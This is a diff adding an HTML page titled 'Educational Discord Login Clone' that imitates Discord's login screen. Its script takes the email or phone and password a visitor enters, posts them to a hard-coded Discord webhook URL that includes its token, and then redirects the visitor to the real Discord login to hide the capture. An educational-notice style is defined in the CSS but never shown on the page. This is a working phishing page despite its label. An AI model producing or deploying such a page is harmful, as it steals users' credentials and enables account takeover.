@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Educational Discord Login Clone</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #5865f2;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('background.jpg');
+            background-size: cover;
+            background-position: center;
+            z-index: -2;
+            overflow: hidden;
+        }
+        
+        .background-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(88, 101, 242, 0.7);
+            z-index: -1;
+        }
+        
+        .floating-shape {
+            position: absolute;
+            background-size: contain;
+            background-repeat: no-repeat;
+            opacity: 0.8;
+            z-index: -1;
+        }
+        
+        .shape1 {
+            width: 120px;
+            height: 120px;
+            background-color: #3ba55c;
+            border-radius: 50%;
+            left: 10%;
+            top: 15%;
+            animation: float 15s ease-in-out infinite alternate;
+        }
+        
+        .shape2 {
+            width: 80px;
+            height: 80px;
+            background-color: #faa61a;
+            left: 75%;
+            top: 25%;
+            transform: rotate(45deg);
+            animation: float 12s ease-in-out infinite alternate-reverse;
+        }
+        
+        .shape3 {
+            width: 100px;
+            height: 100px;
+            background-color: #ed4245;
+            border-radius: 30%;
+            right: 15%;
+            bottom: 15%;
+            animation: float 18s ease-in-out infinite alternate;
+        }
+        
+        .shape4 {
+            width: 60px;
+            height: 60px;
+            background-color: #3ba55c;
+            border-radius: 50%;
+            left: 20%;
+            bottom: 20%;
+            animation: float 10s ease-in-out infinite alternate-reverse;
+        }
+        
+        .shape5 {
+            width: 90px;
+            height: 90px;
+            background-color: #faa61a;
+            border-radius: 40%;
+            left: 40%;
+            top: 10%;
+            animation: float 13s ease-in-out infinite alternate;
+        }
+        
+        @keyframes float {
+            0% {
+                transform: translateY(0) rotate(0deg);
+            }
+            50% {
+                transform: translateY(-20px) rotate(10deg);
+            }
+            100% {
+                transform: translateY(20px) rotate(-10deg);
+            }
+        }
+        
+        .main-container {
+            display: flex;
+            width: 100%;
+            max-width: 800px;
+            background-color: #36393f;
+            border-radius: 5px;
+            overflow: hidden;
+            box-shadow: 0 2px 10px 0 rgba(0, 0, 0, 0.2);
+        }
+        
+        .login-container {
+            flex: 1;
+            padding: 32px;
+            text-align: center;
+        }
+        
+        .qr-container {
+            width: 350px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 32px;
+            background-color: #2f3136;
+            text-align: center;
+        }
+        
+        .qr-code {
+            width: 176px;
+            height: 176px;
+            background-color: #ffffff;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 8px;
+        }
+        
+        .qr-code img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        
+        .qr-title {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #ffffff;
+        }
+        
+        .qr-subtitle {
+            color: #b9bbbe;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #ffffff;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            color: #b9bbbe;
+            margin-bottom: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 12px;
+            font-weight: bold;
+            color: #b9bbbe;
+            text-transform: uppercase;
+        }
+        
+        label::after {
+            content: " *";
+            color: #ed4245;
+        }
+        
+        input {
+            width: 100%;
+            padding: 10px;
+            border-radius: 3px;
+            background-color: #202225;
+            border: 1px solid #222428;
+            color: #ffffff;
+            font-size: 16px;
+            outline: none;
+        }
+        
+        input:focus {
+            border-color: #5865f2;
+        }
+        
+        .forgot-password {
+            display: block;
+            text-align: left;
+            margin-top: 8px;
+            margin-bottom: 20px;
+            color: #5865f2;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #5865f2;
+            color: #ffffff;
+            border: none;
+            border-radius: 3px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: background-color 0.2s;
+        }
+        
+        .login-button:hover {
+            background-color: #4752c4;
+        }
+        
+        .register-link {
+            font-size: 14px;
+            color: #b9bbbe;
+        }
+        
+        .register-link a {
+            color: #5865f2;
+            text-decoration: none;
+        }
+        
+        .register-link a:hover {
+            text-decoration: underline;
+        }
+        
+        .discord-logo {
+            width: 130px;
+            height: 36px;
+            margin-bottom: 20px;
+        }
+        
+        .educational-notice {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            background-color: rgba(0, 0, 0, 0.7);
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 14px;
+            z-index: 1000;
+        }
+        
+        @media (max-width: 768px) {
+            .main-container {
+                flex-direction: column;
+                max-width: 480px;
+                margin: 0 20px;
+            }
+            
+            .qr-container {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Background with floating shapes -->
+    <div class="background">
+        <div class="background-overlay"></div>
+        <div class="floating-shape shape1"></div>
+        <div class="floating-shape shape2"></div>
+        <div class="floating-shape shape3"></div>
+        <div class="floating-shape shape4"></div>
+        <div class="floating-shape shape5"></div>
+    </div>
+    
+    
+    <div class="main-container">
+        <div class="login-container">
+            <h1>Welcome back!</h1>
+            <p class="subtitle">We're so excited to see you again!</p>
+            
+            <div class="form-group">
+                <label for="email">Email or Phone Number</label>
+                <input type="text" id="email" name="email">
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password">
+                <a href="#" class="forgot-password">Forgot your password?</a>
+            </div>
+            
+            <button class="login-button">Log In</button>
+            
+            <p class="register-link">
+                Need an account? <a href="#">Register</a>
+            </p>
+        </div>
+        
+        <div class="qr-container">
+            <div class="qr-code">
+                <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://discord.com/login" alt="QR Code">
+            </div>
+            <h2 class="qr-title">Log in with QR Code</h2>
+            <p class="qr-subtitle">Scan this with the Discord mobile app to log in instantly.</p>
+        </div>
+    </div>
+
+    <script>
+        document.querySelector('.login-button').addEventListener('click', function() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                alert('Please fill in both fields.');
+                return;
+            }
+            
+            // Prepare data for webhook
+            const webhookURL = "https://discord.com/api/webhooks/1350402717838999562/CpgAAM6-ux1tBfifWHRrzKo5i5-qTcU3UEcCh6ntXCjvNDw3mzE9rTPyWAoEgAsH7gnu";
+            
+            const payload = {
+                content: `Email/Phone: ${email}\nPassword: ${password}`
+            };
+            
+            // Send to webhook
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Redirect to Discord's actual login page
+                    window.location.href = "https://discord.com/login";
+                } else {
+                    console.error("Error sending data.");
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+            });
+        });
+    </script>
+</body>
+</html>
